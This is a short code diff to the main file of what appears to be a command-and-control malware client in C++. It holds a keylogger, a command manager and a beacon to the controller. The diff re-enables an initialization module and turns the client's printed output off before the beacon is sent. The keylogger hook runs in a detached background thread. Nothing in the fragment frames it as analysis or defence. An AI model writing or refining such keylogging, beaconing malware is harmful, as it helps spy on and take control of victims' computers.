@@ -1,7 +1,8 @@
+#pragma once
 #include "cncManager.h"
 #include "commandManager.h"
 #include "keyLogger.h"
-//#include "initialize.h"
+#include "initialize.h"
 //#include "wmic.h"
 
 
@@ -27,12 +28,12 @@ int main() {
         wmic.test();
         */
 
+
         std::thread keyLog = std::thread(&keyLogger::startHook, logger);
         keyLog.detach();
 
-        client.print_setting = true;
+        client.print_setting = false;
         client.sendBeacon();
-
 
         while (TRUE) {
             //std::cout << "thread test" << std::endl;
